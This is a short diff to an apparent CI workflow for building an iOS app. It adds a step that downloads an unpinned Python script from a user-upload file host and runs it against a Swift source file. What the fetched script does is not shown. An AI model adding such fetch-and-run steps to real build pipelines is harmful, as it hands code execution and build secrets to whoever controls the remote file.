@@ -777,6 +777,13 @@ jobs:
           grep -q "sectionContent(.patches)" "$CONTENT_SWIFT"
           grep -q "sectionContent(.external)" "$CONTENT_SWIFT"
           grep -q scope "$CONTENT_SWIFT"
+      - name: Fix ColorPicker deployment compatibility
+        shell: bash
+        run: |
+          set -euo pipefail
+          PATCH_SWIFT=source/3105-1.1.1/ThreeOneOSFive/views/PatchProjectsView.swift
+          curl -fsSL https://files.manuscdn.com/user_upload_by_module/session_file/310519663912938762/oNKzmxVFPHhGAXPQ.py -o /tmp/fix_colorpicker_compat.py
+          python3 /tmp/fix_colorpicker_compat.py "$PATCH_SWIFT"
       - name: Build original archive and IPA
         shell: bash
         run: |
